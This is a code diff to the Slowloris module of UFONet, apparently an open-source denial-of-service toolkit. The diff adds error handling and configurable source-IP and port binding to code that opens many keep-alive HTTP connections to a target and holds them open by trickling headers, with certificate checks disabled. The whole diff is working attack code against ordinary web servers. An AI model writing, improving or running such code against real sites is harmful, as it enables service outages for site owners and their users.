@@ -21,18 +21,27 @@ def randPort(start, end):
 
 # UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
 def setupSocket(self, ip, address_dict):
-    method = random.choice(self.methods)
-    port = 80
-    if ip.startswith('http://'):
-       ip = ip.replace('http://','')
-       port = 80
-    elif ip.startswith('https://'):
-       ip = ip.replace('https://','')
-       port = 443
-    self.user_agent = random.choice(self.agents).strip()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        method = random.choice(self.methods)
+        port = 80
+        if ip.startswith('http://'):
+            ip = ip.replace('http://','')
+            port = 80
+        elif ip.startswith('https://'):
+            ip = ip.replace('https://','')
+            port = 443
+        self.user_agent = random.choice(self.agents).strip()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    port_no = randPort(address_dict['start'], address_dict['end'])
+    except Exception as e:
+        print("Binding socket exception with {}".format(e))
+        return 
+
+    # print("{}".format(address_dict))
+    if (address_dict['start'] is None) or (address_dict['end'] is None):
+        port_no = randPort(5000, 65000)
+    else:
+        port_no = randPort(int(address_dict['start']), int(address_dict['end']))
     if address_dict['source'] is not None:
         sock.bind((address_dict['source'], port_no))
 
@@ -40,6 +49,7 @@ def setupSocket(self, ip, address_dict):
     if port == 443:
         sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
     sock.connect((ip, port))
+    # print("Using IP {}, user-agent {}".format(ip, self.user_agent))
     if method == "GET":
         http_req = "GET / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
     elif method == "POST":
@@ -95,8 +105,8 @@ def tractor(self, ip, requests, address_dict):
             try:
                 sock, ip = setupSocket(self, ip, address_dict)
                 # print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
-            except:
-                print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]")
+            except Exception as e:
+                print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"], exceptipn {}".format(e))
             self.sockets.append(sock)
         while True: # try to abuse HTTP Headers
             for sock in list(self.sockets):
@@ -109,9 +119,9 @@ def tractor(self, ip, requests, address_dict):
                 sock, ip = setupSocket(self, ip, address_dict)
                 if sock:
                     self.sockets.append(sock)
-    except:
+    except Exception as e:
         if self.warn_flag == False:
-            print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!]")
+            print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!], exception {}".format(e))
         else:
             print("[Info] [AI] [LORIS] The attack may not be effective due to the presence of a [FIREWALL] that blocks persistent connections -> [ABORTING!]")
 
